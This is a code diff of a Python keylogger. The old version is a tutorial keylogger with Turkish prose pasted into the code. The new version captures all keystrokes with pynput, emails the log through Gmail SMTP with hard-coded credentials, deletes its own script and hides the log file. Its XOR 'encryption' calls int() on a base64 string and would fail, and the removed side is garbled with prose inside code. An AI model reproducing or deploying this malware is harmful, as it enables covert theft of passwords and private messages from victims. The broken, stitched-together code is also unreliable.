@@ -1,65 +1,103 @@
-import keyboard # for keylogs
-import smtplib # for sending email using SMTP protocol (gmail)
-# Timer is to make a method runs after an `interval` amount of time
+import smtplib
 from threading import Timer
 from datetime import datetime
 from email.mime.multipart import MIMEMultipart
 from email.mime.text import MIMEText
-SEND_REPORT_EVERY = 60 # in seconds, 60 means 1 minute and so on
+from pynput import keyboard
+import os
+import getpass
+import subprocess
+import base64
+
+SEND_REPORT_EVERY = 60  # saniye cinsinden, 60 1 dakika anlamına gelir
 EMAIL_ADDRESS = "email@provider.tld"
 EMAIL_PASSWORD = "password_here"
-// SEND_REPORT_EVERY'yi 60 olarak ayarlamak, tuş kayıtlarımızı her 60 saniyede bir (yani bir dakika) raporladığımız anlamına gelir. İhtiyaçlarınıza göre bunu düzenlemekte özgürsünüz.
-Bir tuş kaydedicisini en iyi şekilde temsil etmenin yolu, onun için bir sınıf oluşturmaktır ve bu sınıftaki her bir yöntem belirli bir görevi yerine getirir:
-//
 
 class Keylogger:
     def __init__(self, interval, report_method="email"):
-        # we gonna pass SEND_REPORT_EVERY to interval
         self.interval = interval
         self.report_method = report_method
-        # this is the string variable that contains the log of all 
-        # the keystrokes within `self.interval`
         self.log = ""
-        # record start & end datetimes
         self.start_dt = datetime.now()
-        self.end_dt = datetime.now(
-//Varsayılan olarak report_method'u "email" olarak ayarladık, bu da tuş kayıtlarını e-postamıza göndereceğimizi gösterir. Daha sonra "file" şeklinde geçtiğimizde bunun nasıl bir yerel dosyaya kaydedileceğini göreceksiniz.
-Şimdi, her KEY_UP olayı (klavyede bir tuşu bıraktığınızda) için çağrılacak bir geri çağırma alanı olan keyboard modülünün on_release() fonksiyonunu kullanmamız gerekecek. Bu geri çağırma alanı, bir tane parametre olan KeyboardEvent'e sahiptir ve bu parametre name özniteliğine sahiptir
-//
-def callback(self, event):
-        """
-        This callback is invoked whenever a keyboard event is occured
-        (i.e when a key is released in this example)
-        """
-        name = event.name
-        if len(name) > 1:
-            # not a character, special key (e.g ctrl, alt, etc.)
-            # uppercase with []
-            if name == "space":
-                # " " instead of "space"
-                name = " "
-            elif name == "enter":
-                # add a new line whenever an ENTER is pressed
-                name = "[ENTER]\n"
-            elif name == "decimal":
-                name = "."
-            else:
-                # replace spaces with underscores
-                name = name.replace(" ", "_")
-                name = f"[{name.upper()}]"
-        # finally, add the key name to our global `self.log` variable
-        self.log += name
-def update_filename(self):
-        # construct the filename to be identified by start & end datetimes
+        self.end_dt = datetime.now()
+        self.filename = ""
+        self.encrypt_key = self.generate_encrypt_key()
+
+    def generate_encrypt_key(self):
+        username = getpass.getuser()
+        encrypt_key = base64.b64encode(username.encode()).decode()
+        return encrypt_key
+
+    def on_press(self, key):
+        try:
+            self.log += str(key.char)
+        except AttributeError:
+            self.log += " " + str(key) + " "
+
+    def on_release(self, key):
+        if key == keyboard.Key.esc:
+            self.report()
+            return False
+
+    def update_filename(self):
         start_dt_str = str(self.start_dt)[:-7].replace(" ", "-").replace(":", "")
         end_dt_str = str(self.end_dt)[:-7].replace(" ", "-").replace(":", "")
         self.filename = f"keylog-{start_dt_str}_{end_dt_str}"
 
+    def report_to_email(self):
+        msg = MIMEMultipart()
+        msg["From"] = EMAIL_ADDRESS
+        msg["To"] = EMAIL_ADDRESS
+        msg["Subject"] = "Keylog Report"
+        encrypted_log = self.encrypt_log()
+        msg.attach(MIMEText(encrypted_log, "plain"))
+
+        with smtplib.SMTP(host="smtp.gmail.com", port=587) as smtp:
+            smtp.starttls()
+            smtp.login(EMAIL_ADDRESS, EMAIL_PASSWORD)
+            smtp.send_message(msg)
+
+        print("[+] Keylog report sent via email")
+
     def report_to_file(self):
-        """This method creates a log file in the current directory that contains
-        the current keylogs in the `self.log` variable"""
-        # open the file in write mode (create it)
         with open(f"{self.filename}.txt", "w") as f:
-            # write the keylogs to the file
-            print(self.log, file=f)
+            f.write(self.log)
         print(f"[+] Saved {self.filename}.txt")
+
+    def encrypt_log(self):
+        encrypted_log = ""
+        for char in self.log:
+            encrypted_char = chr(ord(char) ^ int(self.encrypt_key))
+            encrypted_log += encrypted_char
+        return encrypted_log
+
+    def decrypt_log(self, encrypted_log):
+        decrypted_log = ""
+        for char in encrypted_log:
+            decrypted_char = chr(ord(char) ^ int(self.encrypt_key))
+            decrypted_log += decrypted_char
+        return decrypted_log
+
+    def start(self):
+        with keyboard.Listener(on_press=self.on_press, on_release=self.on_release) as listener:
+            listener.join()
+
+    def report(self):
+        self.end_dt = datetime.now()
+        self.update_filename()
+
+        if self.report_method == "email":
+            self.report_to_email()
+        elif self.report_method == "file":
+            self.report_to_file()
+
+        self.cleanup()
+
+    def cleanup(self):
+        os.remove(__file__)
+        subprocess.call(["attrib", "+h", self.filename+".txt"])
+
+if __name__ == "__main__":
+    keylogger = Keylogger(interval=SEND_REPORT_EVERY)
+    keylogger.start()
+
